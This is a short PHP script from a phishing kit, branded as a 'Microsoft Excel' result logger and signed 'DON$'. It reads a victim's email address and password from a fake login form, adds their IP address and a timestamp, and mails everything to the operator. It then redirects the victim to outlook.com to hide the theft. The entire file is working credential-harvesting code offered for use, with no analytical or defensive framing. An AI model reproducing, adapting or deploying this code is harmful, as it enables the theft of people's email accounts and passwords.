<?
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message  = "---------------+ Microsoft Excel  ~ rEsULt ~ DON$ +--------------\n";
$message .= "Email - ID: ".$_POST['Z3Z3-1']."\n";
$message .= "Password: ".$_POST['Z3Z3-2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ ~ Microsoft Excel ~ + = L0G$Z-----------------\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Created By DON$-----------------\n";
$send = "email @ email .com";
$subject = "~*Microsoft Excel *~ = E-MAIL ReZulT*~";
$headers = "From: Ali<DON$$>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://outlook.com/");
	  

?>
